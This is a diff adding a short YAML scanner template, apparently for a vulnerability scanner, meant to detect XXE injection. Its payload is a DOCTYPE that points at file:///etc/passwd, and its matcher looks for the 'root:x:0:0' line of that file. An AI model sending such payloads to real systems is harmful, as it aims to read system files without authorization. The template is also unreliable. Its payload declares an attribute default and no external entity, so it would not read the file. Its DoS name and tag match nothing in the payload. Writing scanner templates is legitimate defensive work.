@@ -1,0 +1,22 @@
+id: xxe3-07
+name: 'XXE DoS/entity in data'
+severity: high
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+  - dos
+description: 'XXE entity via data'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      data:
+        - '<!DOCTYPE r [<!ATTLIST r x CDATA "file:///etc/passwd">]>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
